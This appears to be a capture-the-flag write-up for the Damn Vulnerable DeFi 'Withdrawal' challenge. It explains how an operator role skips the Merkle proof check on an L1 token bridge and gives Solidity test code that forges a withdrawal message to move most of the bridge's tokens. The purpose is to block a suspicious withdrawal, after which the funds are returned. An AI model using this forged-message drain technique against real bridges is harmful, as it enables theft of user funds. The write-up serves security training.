## [Withdrawal](https://www.damnvulnerabledefi.xyz/challenges/withdrawal/)

> There’s a token bridge to withdraw Damn Valuable Tokens from an L2 to L1. It has a million DVT tokens in balance.
>
> The L1 side of the bridge allows anyone to finalize withdrawals, as long as the delay period has passed and they present a valid Merkle proof. The proof must correspond with the latest withdrawals’ root set by the bridge owner.
>
> You were given the event logs of 4 withdrawals initiated on L2 in a JSON file. They could be executed on L1 after the 7 days delay.
>
> But there’s one suspicious among them, isn’t there? You may want to double-check, because all funds might be at risk. Luckily you are a bridge operator with special powers.
>
> Protect the bridge by finalizing *all* given withdrawals, preventing the suspicious one from executing, and somehow not draining all funds.

### Analysis

> Protect the bridge by finalizing *all* given withdrawals, preventing the suspicious one from executing, and somehow not draining all funds.

First, we need to know how to complete a withdrawal, which can be accomplished using the following Solidity code. The log hex string is derived from the emitted JSON data. The structure of the JSON file is documented as follows.

```json
/*
  event MessageStored(
    bytes32 id, uint256 indexed nonce, address indexed caller, address indexed target, uint256 timestamp, bytes data
  );
*/
[
  {
    // Only the indexed data will be stored into topics, since they need to be searched efficiently
    "topics": [
      "0x43738d035e226f1ab25d294703b51025bde812317da73f87d849abbdbb6526f5", // The event identifier
      "0x0000000000000000000000000000000000000000000000000000000000000000", // uint256 indexed nonce
      "0x00000000000000000000000087EAD3e78Ef9E26de92083b75a3b037aC2883E16", // address indexed caller
      "0x000000000000000000000000fF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5"  // address indexed target
    ],
    // The none-indexed part will be encoded to the `data` below
    // (bytes32 id, uint256 timestamp, bytes data)
    "data": "0xeaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba0000000000000000000000000000000000000000000000000000000066729b630000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000010401210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
  },
  // [...]
]
```



```solidity
contract WithdrawalChallenge is Test {
  // [...]
  function test_withdrawal() public checkSolvedByPlayer {
  	finalizeWithdrawal(0, hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba0000000000000000000000000000000000000000000000000000000066729b630000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000010401210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000");
  }
  function finalizeWithdrawal(uint256 nonce, bytes memory eventData) internal {
    bytes32 id;
    address msgSender = address(0x00000000000000000000000087EAD3e78Ef9E26de92083b75a3b037aC2883E16);
    address target = address(0x000000000000000000000000fF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5);
    uint256 timestamp;
    bytes memory data;

    (id, timestamp, data) = abi.decode(
      eventData,
      (bytes32, uint256, bytes)
    );
    l1Gateway.finalizeWithdrawal(
      nonce,
      msgSender,
      target,
      timestamp,
      data,
      new bytes32[](0)
    );
    // console.logBytes(data);
  }
  // [...]
}
```

If we examine the steps involved in finalizing a withdrawal (see below), we can comprehend the process of withdrawing.

```solidity
    ├─ [108928] L1Gateway::finalizeWithdrawal(3, l2Handler: [0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16], L1Forwarder: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1718787127 [1.718e9], 0x01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000, [])
    │   ├─ [78323] L1Forwarder::forwardMessage(3, 0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b, TokenBridge: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0x81191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e80000)
    │   │   ├─ [426] L1Gateway::xSender() [staticcall]
    │   │   │   └─ ← [Return] l2Handler: [0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16]
    │   │   ├─ [26845] TokenBridge::executeTokenWithdrawal(0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b, 10000000000000000000 [1e19])
    │   │   │   ├─ [365] L1Forwarder::getSender() [staticcall]
    │   │   │   │   └─ ← [Return] 0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b
    │   │   │   ├─ [24874] DamnValuableToken::transfer(0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b, 10000000000000000000 [1e19])
    │   │   │   │   ├─ emit Transfer(from: TokenBridge: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], to: 0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b, amount: 10000000000000000000 [1e19])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   ├─ emit FinalizedWithdrawal(leaf: 0x9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09, success: true, isOperator: true)
    │   └─ ← [Stop] 
```

Next, since we have an operator role, we can bypass the Merkle proof check when calling the `L1Gateway::finalizeWithdrawal` function. This allows us to drain the token from the `l1TokenBridge` using the withdrawal process above.

```solidity
contract L1Gateway is OwnableRoles {
    // [...]
    function finalizeWithdrawal(
        uint256 nonce,
        address l2Sender,
        address target,
        uint256 timestamp,
        bytes memory message,
        bytes32[] memory proof
    ) external {
        // [...]
        bool isOperator = hasAnyRole(msg.sender, OPERATOR_ROLE);
        if (!isOperator) {
            if (MerkleProof.verify(proof, root, leaf)) {
                emit ValidProof(proof, root, leaf);
            } else {
                revert InvalidProof();
            }
        }
        // [...]
        xSender = l2Sender;
        bool success;
        assembly {
            success := call(gas(), target, 0, add(message, 0x20), mload(message), 0, 0) // call with 0 value. Don't copy returndata.
        }
        xSender = address(0xBADBEEF);

        emit FinalizedWithdrawal(leaf, success, isOperator);
    }
}
```

Therefore, we can withdraw the tokens away using the code below.

```solidity
l1Gateway.finalizeWithdrawal(
  4,
  address(l2Handler),
  address(l1Forwarder),
  0,
  abi.encodeCall(
    L1Forwarder.forwardMessage, 
    (
      0, 
      address(l1Gateway), 
      address(l1TokenBridge), 
      abi.encodeCall(TokenBridge.executeTokenWithdrawal, (player, INITIAL_BRIDGE_TOKEN_AMOUNT-3e19))
    )
  ),
  new bytes32[](0)
);
```

### Solution

```solidity
function test_withdrawal() public checkSolvedByPlayer {
  // We only need to left 3*1e19 token in the bridge since there are three valid withdrawals with 1e19 tokens each
  // This will stop the malicious withdrawal attempt, which withdraws a lot of token.
  // 		(Since the tokens will not be enough for the malicious withdrawal attempt, the token tranfer will revert, which stop the malicious withdrawal.
  l1Gateway.finalizeWithdrawal(
      4,
      address(l2Handler),
      address(l1Forwarder),
      0,
      abi.encodeCall(
          L1Forwarder.forwardMessage, 
          (
              0, 
              address(l1Gateway), 
              address(l1TokenBridge), 
              abi.encodeCall(TokenBridge.executeTokenWithdrawal, (player, INITIAL_BRIDGE_TOKEN_AMOUNT-3e19))
          )
      ),
      new bytes32[](0)
  );

  vm.warp(block.timestamp + 8 days);
  // normal withdrawals
  finalizeWithdrawal(0, hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba0000000000000000000000000000000000000000000000000000000066729b630000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000010401210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000");
  finalizeWithdrawal(1, hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de600000000000000000000000000000000000000000000000000000000066729b950000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000010401210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000");
  finalizeWithdrawal(3, hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b090000000000000000000000000000000000000000000000000000000066729c370000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000010401210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000");

  // suspicious withdrawal
  finalizeWithdrawal(2, hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea6889090150000000000000000000000000000000000000000000000000000000066729bea0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000010401210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c26000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000");

  // Put back the saved tokens
  token.transfer(address(l1TokenBridge), token.balanceOf(player));
}
function finalizeWithdrawal(uint256 nonce, bytes memory eventData) internal {
  bytes32 id;
  address msgSender = address(0x00000000000000000000000087EAD3e78Ef9E26de92083b75a3b037aC2883E16);
  address target = address(0x000000000000000000000000fF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5);
  uint256 timestamp;
  bytes memory data;

  (id, timestamp, data) = abi.decode(
      eventData,
      (bytes32, uint256, bytes)
  );
  l1Gateway.finalizeWithdrawal(
      nonce,
      msgSender,
      target,
      timestamp,
      data,
      new bytes32[](0)
  );
  // console.logBytes(data);
}
```

Full solution can be found in [Withdrawal.t.sol](./Withdrawal.t.sol#L92).